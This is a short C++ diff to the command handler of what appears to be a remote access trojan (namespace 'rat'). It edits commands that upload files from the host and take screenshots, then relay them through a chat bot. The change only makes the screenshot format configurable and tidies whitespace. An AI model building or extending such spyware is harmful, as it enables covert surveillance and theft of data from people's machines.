@@ -32,7 +32,7 @@ void Handler::handleGetCommand() {
         this->bot.sendMessage(fmt::format("File does not exist: {}", file_path.string()));
         return;
     }
-
+    
     const size_t file_size = std::filesystem::file_size(file_path);
     DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);
 
@@ -67,15 +67,13 @@ void Handler::handleGetCommand() {
 
 void Handler::handleScreenshotCommand() {
     auto image_path = std::filesystem::path(
-        fmt::format("{}.jpg", rat::system::getCurrentDateTime_Underscored())
-    );
-
+        fmt::format("{}.{}", rat::system::getCurrentDateTime_Underscored(), this->state.screenshot_format)
+        );
     this->process_pool.enqueue([this, image_path] {
         std::string output_buffer;
         bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
         
         std::lock_guard<std::mutex> lock(backing_bot_mutex);
-        
         if (success && std::filesystem::exists(image_path)) {
             DEBUG_LOG("{} taken", image_path.string());
 
@@ -84,12 +82,10 @@ void Handler::handleScreenshotCommand() {
             }
             rat::system::removeFile(image_path);
         }
-
         if (!output_buffer.empty()) {
             this->backing_bot.sendMessage(output_buffer);
         }
     });
-
     this->bot.sendMessage("Screenshot command launched.");
 }
 
